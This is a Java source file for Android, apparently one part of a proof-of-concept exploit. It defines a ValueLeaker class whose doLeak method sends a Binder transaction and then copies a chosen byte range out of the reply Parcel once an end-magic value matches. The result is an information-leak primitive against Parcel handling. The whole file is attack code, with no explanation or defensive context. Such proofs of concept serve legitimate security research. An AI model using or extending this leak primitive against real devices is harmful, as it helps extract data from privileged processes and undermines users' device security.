package com.example.leakvalue;

import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;

import java.util.Objects;

public class ValueLeaker {
    private final IBinder mRetriever;
    private final int mLeakPosition;
    private final int mLeakSize;
    private final long mEndMagic;

    //
    ValueLeaker(IBinder retriever, int leakPosition, int leakSize, long endMagic) {
        mRetriever = Objects.requireNonNull(retriever);
        mLeakPosition = leakPosition;
        mLeakSize = leakSize;
        mEndMagic = endMagic;
    }

    public Parcel doLeak() throws RemoteException {
        Parcel leakedParcel = null;
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        data.writeInt(1);
        mRetriever.transact(IBinder.FIRST_CALL_TRANSACTION, data, reply, 0);
        reply.setDataPosition(mLeakPosition + mLeakSize + 4);
        if (reply.readLong() == mEndMagic) {
            leakedParcel = Parcel.obtain();
            leakedParcel.appendFrom(reply, mLeakPosition, mLeakSize);
        }
        reply.recycle();
        data.recycle();
        return leakedParcel;
    }
}
